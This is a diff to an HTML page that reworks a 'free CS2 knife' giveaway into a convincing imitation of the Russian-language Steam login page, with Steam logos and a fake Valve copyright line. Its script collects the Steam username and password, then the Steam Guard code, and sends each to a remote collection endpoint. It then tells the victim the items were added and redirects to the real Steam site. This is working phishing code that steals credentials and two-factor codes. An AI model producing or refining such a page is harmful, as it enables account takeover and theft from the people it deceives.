@@ -3,150 +3,178 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>CS2 FREE KNIFE + GLOVES DROP 2026</title>
+  <title>Steam Community :: Вход</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
   
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
     body {
-      background: linear-gradient(135deg, #0a0e14 0%, #000814 100%);
-      color: #c9d1d9;
-      font-family: 'Roboto', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #171a21;
+      color: #c6d4df;
+      font-family: 'Roboto', Arial, sans-serif;
       min-height: 100vh;
       display: flex;
-      align-items: center;
       justify-content: center;
-      padding: 20px;
+      align-items: center;
+      background-image: url('https://community.akamai.steamstatic.com/public/images/login_bg_2x.jpg');
+      background-size: cover;
+      background-position: center;
     }
-    .container {
-      background: rgba(13,17,23,0.92);
-      backdrop-filter: blur(12px);
-      border-radius: 20px;
-      padding: 45px 35px;
+    .steam-container {
+      background: rgba(0,0,0,0.75);
+      backdrop-filter: blur(8px);
+      border-radius: 4px;
       width: 100%;
-      max-width: 500px;
-      border: 1px solid rgba(88,166,255,0.25);
-      box-shadow: 0 25px 60px rgba(0,0,0,0.8);
+      max-width: 460px;
+      padding: 40px 35px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.8);
       text-align: center;
-      animation: fadeUp 0.8s ease-out;
+    }
+    .steam-logo {
+      width: 180px;
+      margin-bottom: 30px;
     }
     h1 {
-      font-family: 'Orbitron', sans-serif;
-      font-size: 3rem;
-      color: #58a6ff;
-      text-shadow: 0 0 25px rgba(88,166,255,0.7);
-      margin-bottom: 10px;
-      letter-spacing: 3px;
+      font-size: 24px;
+      font-weight: 500;
+      margin-bottom: 8px;
+      color: #ffffff;
     }
     .subtitle {
-      font-size: 1.4rem;
-      color: #ff4757;
-      margin-bottom: 25px;
-      animation: pulse 3s infinite;
+      font-size: 14px;
+      color: #8f98a0;
+      margin-bottom: 30px;
     }
     .step {
       display: none;
     }
     .step.active {
       display: block;
-      animation: fadeIn 0.6s ease;
+    }
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 13px;
+      color: #c6d4df;
+      font-weight: 500;
     }
     input {
       width: 100%;
-      padding: 16px 18px;
-      margin: 12px 0;
-      border: 1px solid #30363d;
-      border-radius: 10px;
-      background: #0d1117;
-      color: #e6edf3;
-      font-size: 1.1rem;
-      transition: all 0.3s;
+      padding: 12px 14px;
+      border: 1px solid #2a475e;
+      border-radius: 3px;
+      background: #1b2838;
+      color: white;
+      font-size: 16px;
+      transition: border-color 0.2s;
     }
     input:focus {
-      border-color: #58a6ff;
-      box-shadow: 0 0 0 4px rgba(88,166,255,0.3);
+      border-color: #66c0f4;
       outline: none;
     }
-    button {
+    .btn {
       width: 100%;
-      background: linear-gradient(90deg, #238636, #2ea044);
+      background: #1b2838;
       color: white;
-      padding: 18px;
+      padding: 14px;
       border: none;
-      border-radius: 10px;
-      font-size: 1.35rem;
-      font-weight: 700;
+      border-radius: 3px;
+      font-size: 16px;
+      font-weight: 500;
       cursor: pointer;
-      transition: all 0.3s;
-      margin-top: 15px;
-      position: relative;
+      transition: all 0.2s;
+      margin-top: 10px;
     }
-    button:hover:not(:disabled) {
-      transform: translateY(-3px);
-      box-shadow: 0 12px 30px rgba(46,160,67,0.6);
+    .btn:hover {
+      background: #2a475e;
     }
-    button.loading::after {
+    .btn.primary {
+      background: #66c0f4;
+      color: #0e141b;
+    }
+    .btn.primary:hover {
+      background: #4ea1d3;
+    }
+    .btn.loading {
+      background: #2a475e;
+      cursor: wait;
+    }
+    .btn.loading::after {
       content: '';
-      position: absolute;
-      top: 50%; left: 50%;
-      width: 24px; height: 24px;
-      border: 4px solid white;
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid white;
       border-top-color: transparent;
       border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      transform: translate(-50%, -50%);
+      animation: spin 1s linear infinite;
+      margin-left: 10px;
+      vertical-align: middle;
     }
     .timer {
-      margin-top: 15px;
-      font-size: 1.1rem;
-      color: #ff9f1c;
+      margin-top: 12px;
+      font-size: 14px;
+      color: #66c0f4;
     }
-    .valve-note {
-      margin-top: 35px;
-      font-size: 0.95rem;
-      color: #58a6ff;
-      opacity: 0.75;
+    .footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #8f98a0;
     }
-    @keyframes fadeUp { from {opacity:0; transform:translateY(40px);} to {opacity:1; transform:translateY(0);} }
-    @keyframes fadeIn  { from {opacity:0;} to {opacity:1;} }
-    @keyframes pulse   { 0%,100%{opacity:1;} 50%{opacity:0.65;} }
-    @keyframes spin    { to {transform:rotate(360deg);} }
-    @media (max-width: 480px) {
-      .container { padding: 35px 25px; }
-      h1 { font-size: 2.4rem; }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h1>CS2 FREE KNIFE DROP</h1>
-    <div class="subtitle">LIMITED 2026 — 30 SLOTS LEFT!</div>
+  <div class="steam-container">
+    <img src="https://community.akamai.steamstatic.com/public/images/login_logo.png" alt="Steam" class="steam-logo">
 
     <!-- Шаг 1: Логин + Пароль -->
     <div id="step1" class="step active">
-      <p>Введи данные Steam для получения ножа</p>
+      <h1>Вход в аккаунт Steam</h1>
+      <div class="subtitle">Для получения бесплатного ножа введите данные</div>
+
       <form id="loginForm">
-        <input type="text" id="username" placeholder="Steam Login" required autocomplete="off"/>
-        <input type="password" id="password" placeholder="Пароль" required autocomplete="off"/>
-        <button type="submit" id="loginBtn">ПРОДОЛЖИТЬ</button>
+        <div class="input-group">
+          <label>Имя пользователя (или email)</label>
+          <input type="text" id="username" placeholder="Имя аккаунта" required autocomplete="off"/>
+        </div>
+        <div class="input-group">
+          <label>Пароль</label>
+          <input type="password" id="password" placeholder="Пароль" required autocomplete="off"/>
+        </div>
+        <button type="submit" id="loginBtn" class="btn primary">Войти</button>
       </form>
     </div>
 
-    <!-- Шаг 2: Ввод кода Guard -->
+    <!-- Шаг 2: Ввод кода Steam Guard -->
     <div id="step2" class="step">
-      <h3 style="color:#58a6ff; margin-bottom:15px;">Верификация Steam</h3>
-      <p>Код подтверждения отправлен на твою почту</p>
-      <p style="font-size:0.95rem; color:#8b949e; margin-bottom:20px;">Придёт в течение 10–40 секунд</p>
-      
-      <input type="text" id="guardCode" placeholder="5-значный код из почты" maxlength="5" required autocomplete="off"/>
-      <button id="guardBtn">ПОДТВЕРДИТЬ</button>
+      <h1>Подтверждение входа</h1>
+      <div class="subtitle">Введите код из письма Steam Guard</div>
+      <p style="font-size: 14px; color: #8f98a0; margin-bottom: 25px;">
+        Код отправлен на вашу почту.<br>Проверьте папку "Входящие" или "Спам" (придёт в течение 30–60 секунд).
+      </p>
+
+      <div class="input-group">
+        <label>Код подтверждения (5 символов)</label>
+        <input type="text" id="guardCode" placeholder="XXXXX" maxlength="5" required autocomplete="off"/>
+      </div>
+      <button id="guardBtn" class="btn primary">Подтвердить</button>
       <div class="timer" id="timer">Осталось: 60 сек</div>
     </div>
 
-    <p class="valve-note">Официальная акция от Steam & Valve • Limited time only</p>
+    <div class="footer">
+      © Valve Corporation. Все права защищены.
+    </div>
   </div>
 
   <script>
@@ -169,34 +197,31 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-      } catch {}
+      } catch (e) {}
     }
 
-    // Шаг 1 — отправка логина/пароля
+    // Шаг 1
     document.getElementById('loginForm').addEventListener('submit', async e => {
       e.preventDefault();
       if (loginBtn.disabled) return;
 
       loginBtn.disabled = true;
       loginBtn.classList.add('loading');
-      loginBtn.textContent = 'ОТПРАВКА...';
+      loginBtn.textContent = 'Вход...';
 
       const data = {
-        type: 'credentials',
+        type: 'steam_login',
         username: document.getElementById('username').value.trim(),
         password: document.getElementById('password').value.trim(),
-        time: new Date().toISOString(),
-        user_agent: navigator.userAgent,
-        screen: `${screen.width}x${screen.height}`
+        timestamp: new Date().toISOString(),
+        user_agent: navigator.userAgent
       };
 
       await sendData(data);
 
-      // Переход ко второму шагу
       step1.classList.remove('active');
       step2.classList.add('active');
 
-      // Таймер
       timeLeft = 60;
       timerEl.textContent = `Осталось: ${timeLeft} сек`;
       timerInterval = setInterval(() => {
@@ -204,31 +229,31 @@
         timerEl.textContent = `Осталось: ${timeLeft} сек`;
         if (timeLeft <= 0) {
           clearInterval(timerInterval);
-          timerEl.textContent = 'Время истекло — попробуй позже';
+          timerEl.textContent = 'Время истекло. Попробуйте снова.';
         }
       }, 1000);
     });
 
-    // Шаг 2 — отправка кода Guard
+    // Шаг 2
     guardBtn.addEventListener('click', async () => {
-      const code = document.getElementById('guardCode').value.trim();
-      if (code.length !== 5 || !/^\d{5}$/.test(code)) {
-        return alert('Код должен состоять из 5 цифр!');
+      const code = document.getElementById('guardCode').value.trim().toUpperCase();
+      if (code.length !== 5) {
+        return alert('Код должен состоять из 5 символов!');
       }
 
       guardBtn.disabled = true;
       guardBtn.classList.add('loading');
-      guardBtn.textContent = 'ВЕРИФИКАЦИЯ...';
+      guardBtn.textContent = 'Проверка...';
 
       const data = {
-        type: 'guard_code',
-        guard: code,
-        time: new Date().toISOString()
+        type: 'steam_guard',
+        guard_code: code,
+        timestamp: new Date().toISOString()
       };
 
       await sendData(data);
 
-      alert('Аккаунт успешно верифицирован!\nНож и перчатки добавлены в инвентарь. Перезагрузи CS2!');
+      alert('Вход выполнен успешно!\nБесплатный нож и перчатки добавлены в ваш инвентарь.\nПерезагрузите CS2 для получения предметов.');
       window.location.href = 'https://steamcommunity.com/';
     });
   </script>
